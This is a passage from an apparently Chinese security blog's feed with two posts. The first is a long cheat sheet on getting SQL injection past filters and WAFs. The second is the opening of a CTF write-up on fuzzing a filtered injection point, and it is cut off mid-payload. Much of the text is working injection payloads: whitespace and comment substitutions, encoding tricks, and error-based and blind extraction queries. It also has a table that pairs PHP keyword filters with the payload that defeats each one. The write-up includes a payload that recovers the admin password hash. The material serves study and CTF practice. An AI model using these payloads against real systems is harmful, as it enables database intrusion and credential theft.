    <link href="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html"/>
    <id>https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html</id>
    <published>2020-02-25T07:46:56.000Z</published>
    <updated>2020-03-02T02:59:16.257Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h3 id="0x01-数据库特性"><a href="#0x01-数据库特性" class="headerlink" title="0x01 数据库特性"></a>0x01 数据库特性</h3><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>常见的注释符号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#，--空格，-- -，--+，&#x2F;&#x2F;，&#x2F;**&#x2F;，&#x2F;*任意字符串*&#x2F;，;</span><br></pre></td></tr></table></figure><br>一般是使用/<strong>/来绕过过滤空格。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1;</span><br><span class="line">select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#x2F;*111*&#x2F;where&#x2F;**&#x2F;id&#x3D;1;</span><br></pre></td></tr></table></figure><br>上面两条语句执行结果是一样的。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/1.png" class title="This is an test image"><br>需要注意的是：虽然#，–空格 – - –+都是注释符，但是在不同网站对它们的解析不同。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/2.png" class title="This is an test image"><br>这个时候就需要我们多加测试，看看哪种注释符可以被网站的数据库解析执行。<br><a id="more"></a><br>这里来了个知识点：怎么绕过过滤空格加注释符的sql注入？<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4&#x2F;**&#x2F;or&#x2F;**&#x2F;&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><br>我们可以使用/</strong>/ 块注释或者一些url编码的特殊字符(%09,%0a,%0b,%0c,%0d,%20,%a0 )来替换空格，用or ‘1’=’1的方式闭合后面的引号，这样就可以绕过空格加注释过滤的sql注入。</p><p><strong>在本地测试的时候不能直接把%09等特殊字符放到sql语句中，必须经过url解码。</strong></p><p>其他可以代替空格的方法：<br><strong>浮点数代替空格</strong><br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/3.png" class title="This is an test image"><br><strong>科学计数法代替空格</strong><br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/4.png" class title="This is an test image"><br><strong>括号绕过()</strong><br>在进行空格的时候需要注意：不是所有的语句都支持括号代替空格的。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/5.png" class title="This is an test image"><br><strong>所以进行括号绕过时，需要在本地测试看语句是否支持括号。</strong><br><strong>加号减号绕过(+,-)</strong><br>进行绕过时最后将+和-进行url编码。<br>和括号绕过一样，对于有些语句是不支持的。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/6.png" class title="This is an test image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96; &#96;号绕过</span><br><span class="line">select * from&#96;users&#96;;</span><br></pre></td></tr></table></figure><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/7.png" class title="This is an test image"><p>同上面一样对于一些语句也是不支持。</p><p><strong>~,!,@,+,-,””,’’,{}等特殊字符绕过空格。</strong><br>这些绕过过滤的空格的字符，在一些语句都是不支持的，需要在本地经过测试才行。</p><hr><h4 id="sql函数和关键字"><a href="#sql函数和关键字" class="headerlink" title="sql函数和关键字"></a>sql函数和关键字</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MySQL：</span><br><span class="line">union distinct</span><br><span class="line">union distinctrow</span><br><span class="line">procedure analyse()</span><br><span class="line">updatexml()</span><br><span class="line">extracavalue()</span><br><span class="line">exp()</span><br><span class="line">ceil()</span><br><span class="line">atan()</span><br><span class="line">sqrt()</span><br><span class="line">floor()</span><br><span class="line">ceiling()</span><br><span class="line">tan()</span><br><span class="line">rand()</span><br><span class="line">sign()</span><br><span class="line">greatest()</span><br><span class="line">字符串截取函数</span><br><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Lpad(version(),1,1)</span><br><span class="line">Rpad(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1)</span><br><span class="line">字符串连接函数</span><br><span class="line">concat(version(),&#39;|&#39;,user());</span><br><span class="line">concat_ws(&#39;|&#39;,1,2,3)</span><br><span class="line">字符转换</span><br><span class="line">Char(49)</span><br><span class="line">Hex(&#39;a&#39;)</span><br><span class="line">Unhex(61)</span><br><span class="line">过滤了逗号</span><br><span class="line">(1)limit处的逗号：</span><br><span class="line">limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号</span><br><span class="line">mid处的逗号：</span><br><span class="line">mid(version() from 1 for 1)</span><br><span class="line">MSSQL：</span><br><span class="line">IS_SRVROLEMEMBER()</span><br><span class="line">IS_MEMBER()</span><br><span class="line">HAS_DBACCESS()</span><br><span class="line">convert()</span><br><span class="line">col_name()</span><br><span class="line">object_id()</span><br><span class="line">is_srvrolemember()</span><br><span class="line">is_member()</span><br><span class="line">字符串截取函数</span><br><span class="line">Substring(@@version,1,1)</span><br><span class="line">Left(@@version,1)</span><br><span class="line">Right(@@version,1)</span><br><span class="line">(2)字符串转换函数</span><br><span class="line">Ascii(&#39;a&#39;) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass</span><br><span class="line">Char(&#39;97&#39;)</span><br><span class="line">exec</span><br></pre></td></tr></table></figure><hr><h3 id="0x02-绕过过滤"><a href="#0x02-绕过过滤" class="headerlink" title="0x02 绕过过滤"></a>0x02 绕过过滤</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>数据库对大小写不敏感，如果后台代码只过滤的小写的关键字，我们可以通过大小写混合来绕过。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/8.png" class title="This is an test image"></p><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p>这个mysql才有的特性:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*!关键字*&#x2F;</span><br></pre></td></tr></table></figure><br>上面的代码会没数据库解析执行为sql语句。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/9.png" class title="This is an test image"></p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>1.URL编码<br>在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：page.php?id=1%252f%252a*/UNION%252f%252a /SELECT<br>2.十六进制编码<br>常用的是对参数进行十六进制编码，对一些关键字最好不用编码。<br>3.Unicode编码<br>Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了看一下常用的几个符号的一些Unicode编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">单引号: %u0027、%u02b9、%u02bc%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</span><br><span class="line"></span><br><span class="line">空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</span><br><span class="line"></span><br><span class="line">左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</span><br><span class="line"></span><br><span class="line">右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</span><br></pre></td></tr></table></figure></p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>%20 %09 %0a %0b %0c %0d %a0 /**/  这些都可以替换空格。</p><p><strong>当这些字符都被过滤时，我们可以使用括号将子查询包含起来:任何可以计算出结果的语句，都可以用括号包围起来。</strong></p><h4 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin()，ord() &#x3D;&#x3D;&gt; ascii()</span><br><span class="line"></span><br><span class="line">sleep() &#x3D;&#x3D;&gt;benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()&#x3D;&#x3D;&gt;group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() &#x3D;&#x3D;&gt; substring()</span><br><span class="line"></span><br><span class="line">@@user &#x3D;&#x3D;&gt; user()</span><br><span class="line"></span><br><span class="line">@@datadir &#x3D;&#x3D;&gt; datadir()</span><br><span class="line"></span><br><span class="line">举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((select &#39;password&#39;),1,1) &#x3D; 0x70</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x69) &#x3D; 1</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x70) &#x3D; 0</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x71) &#x3D; -1</span><br></pre></td></tr></table></figure><h4 id="特殊函数绕过"><a href="#特殊函数绕过" class="headerlink" title="特殊函数绕过"></a>特殊函数绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 通过greatest函数绕过不能使用大小于符号的情况</span><br><span class="line"></span><br><span class="line">greatest(a,b)，返回a和b中较大的那个数。</span><br><span class="line">当我们要猜解user()第一个字符的ascii码是否小于等于150时，可使用：</span><br><span class="line">mysql&gt; select greatest(ascii(mid(user(),1,1)),150)&#x3D;150;</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">| greatest(ascii(mid(user(),1,1)),150)&#x3D;150 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">如果小于150，则上述返回值为True。</span><br><span class="line"></span><br><span class="line">2. 通过substr函数绕过不能使用逗号的情况</span><br><span class="line"></span><br><span class="line">mid(user() from 1 for 1)</span><br><span class="line">或</span><br><span class="line">substr(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ascii(substr(user() from 1 for 1)) &lt; 150;</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">| ascii(substr(user() from 1 for 1)) &lt; 150 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line"> +------------------------------------------+</span><br><span class="line"></span><br><span class="line">3.使用数学运算函数在子查询中报错</span><br><span class="line"></span><br><span class="line">exp(x)函数的作用： 取常数e的x次方，其中，e是自然对数的底。</span><br><span class="line"></span><br><span class="line">~x 是一个一元运算符，将x按位取补</span><br><span class="line"></span><br><span class="line">select exp(~(select*from(select user())a))</span><br><span class="line">mysql报错：</span><br><span class="line">mysql&gt; select exp(~(select*from(select user())a));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’</span><br><span class="line"></span><br><span class="line">这条查询会出错，是因为exp(x)的参数x过大，超过了数值范围，分解到子查询，就是：</span><br><span class="line"></span><br><span class="line">(select*from(select user())a) 得到字符串 root@localhost</span><br><span class="line"></span><br><span class="line">表达式’root@localhost’被转换为0，按位取补之后得到一个非常的大数，它是MySQL中最大的无符号整数</span><br></pre></td></tr></table></figure><h4 id="PHP一些常见的过滤方法及绕过方式"><a href="#PHP一些常见的过滤方法及绕过方式" class="headerlink" title="PHP一些常见的过滤方法及绕过方式"></a>PHP一些常见的过滤方法及绕过方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">过滤关键字    and or</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 or 1&#x3D;1 1 and 1&#x3D;1</span><br><span class="line">绕过方式    1 || 1&#x3D;1 1 &amp;&amp; 1&#x3D;1</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    union select user,password from users</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users where userid&#x3D;1)&#x3D;&#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;#user_id聚合中user_id为1的user为admin</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) &#x3D; 1</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) &#x3D; &#39;a&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line">绕过方式    1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) &#x3D; 0x61 1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line">绕过方式    1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex, substr</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16))&#x2F;td&gt;</span><br><span class="line">绕过方式    1 &amp;&amp; lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and, or, union, where, limit, group by, select, &#39;, hex, substr, 空格</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\&#39;|hex|substr|\s)&#x2F;i&#39;, $id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; lpad(user,7,1)&#x2F;td&gt;</span><br><span class="line">绕过方式    1%0b||%0blpad(user,7,1)</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x01-数据库特性&quot;&gt;&lt;a href=&quot;#0x01-数据库特性&quot; class=&quot;headerlink&quot; title=&quot;0x01 数据库特性&quot;&gt;&lt;/a&gt;0x01 数据库特性&lt;/h3&gt;&lt;h4 id=&quot;注释&quot;&gt;&lt;a href=&quot;#注释&quot; class=&quot;headerlink&quot; title=&quot;注释&quot;&gt;&lt;/a&gt;注释&lt;/h4&gt;&lt;p&gt;常见的注释符号：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#，--空格，-- -，--+，&amp;#x2F;&amp;#x2F;，&amp;#x2F;**&amp;#x2F;，&amp;#x2F;*任意字符串*&amp;#x2F;，;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;一般是使用/&lt;strong&gt;/来绕过过滤空格。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select * from users where id&amp;#x3D;1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;select&amp;#x2F;**&amp;#x2F;*&amp;#x2F;**&amp;#x2F;from&amp;#x2F;**&amp;#x2F;users&amp;#x2F;*111*&amp;#x2F;where&amp;#x2F;**&amp;#x2F;id&amp;#x3D;1;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;上面两条语句执行结果是一样的。&lt;br&gt;&lt;img src=&quot;/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/1.png&quot; class title=&quot;This is an test image&quot;&gt;&lt;br&gt;需要注意的是：虽然#，–空格 – - –+都是注释符，但是在不同网站对它们的解析不同。&lt;br&gt;&lt;img src=&quot;/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/2.png&quot; class title=&quot;This is an test image&quot;&gt;&lt;br&gt;这个时候就需要我们多加测试，看看哪种注释符可以被网站的数据库解析执行。&lt;br&gt;&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入Fuzz记录</title>
    <link href="https://da4er.top/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95.html"/>
    <id>https://da4er.top/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95.html</id>
    <published>2020-02-24T14:34:23.000Z</published>
    <updated>2020-02-24T14:38:23.366Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>从今天开始学习各种fuzz测试，今天做了一道sql注入题，通过fuzz来判断过滤字符，从而构造payload进行绕过。</p><hr><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>拿到题目进行简单的测试<br><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/1.png" class title="This is an test image"><br>发现这题进行了一些sql关键字的过滤，我们通过burp的Intruder模块进行fuzz。<br><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/2.png" class title="This is an test image"><br>字段长度为370的是被过滤的sql语句。<br><strong>进一步分析看看这题目到底过滤了哪些关键字，通过一个个分析知道过滤了：# –+等注释符，空格，%0a,%0b等绕过过滤空格的url编码，逗号(,)，包含and和or的字符。还有很多绕过过滤的关键字，发现没有过滤sleep()，尝试一下时间盲注。</strong><br>常规的时间盲注为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(条件,sleep(3),2)</span><br></pre></td></tr></table></figure><br>但是题目过滤了逗号，想到用case when替换：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when 条件 then sleep(2) else 1 end</span><br></pre></td></tr></table></figure><br>但是过滤了空格等分隔符，同时内联注释 注释符 %0a %0b %0d %a0也多被过滤，我们可以用括号来代替空格：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when(条件)then(sleep(2))else(1)end</span><br></pre></td></tr></table></figure><br>但是测试发现case和when中间是不能添加括号的，到这里时间盲注也是不可行的。</p><p>可以尝试另类的布尔盲注:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;admin&#39;&#x3D;&#39;admin&#39;+1 union select &#39;admin&#39;&#x3D;&#39;admin&#39;+0;</span><br></pre></td></tr></table></figure><br>在本地测试发现，第一个输出0，第二个输出1。<br><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/3.png" class title="This is an test image"><br>这是mysql的一个特性：<strong>在第一个查询中，先进行右边的’admin’+1操作，这个时候会强制转换admin为数字，然后相加完在和等号左边的admin比较，这个时候也会强制转换，所以就会形成不相等的情况。</strong><br>上面就可以形成布尔逻辑判断了。<br>首先我们可以先判断一些admin账号的密码长度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;%2b(length(passwd)&#x3D;32)%2b&#39;</span><br></pre></td></tr></table></figure><br>%2b是+号，不能直接使用加号因为被过滤了，这里也可以使用-号，效果相同。<br>上面的逻辑是：如果passwd长度为32，则返回1，然后和admin作相加操作，这样就会形成逻辑上的差别。如下图：<br><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/4.png" class title="This is an test image"><br><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/5.png" class title="This is an test image"><br>这样就可以判断admin的密码是个32为的md5值。<br>然后在猜解每个字符，通过mid函数进行：<strong>但for被过滤！</strong><br>mid(xxx from 1)  第一位开始取剩下的所有字符<br><strong>ascii(mid(xxx from 1)) 发现截断 取第一个字符的ascii值。</strong><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 